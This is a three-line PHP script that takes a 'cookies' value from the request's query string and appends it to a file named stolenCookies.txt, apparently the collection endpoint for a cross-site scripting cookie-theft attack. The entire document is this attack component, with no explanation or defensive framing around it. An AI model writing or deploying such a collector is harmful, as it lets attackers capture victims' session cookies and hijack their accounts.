<?php
  $content = $_GET['cookies'];
  file_put_contents('stolenCookies.txt', $content);
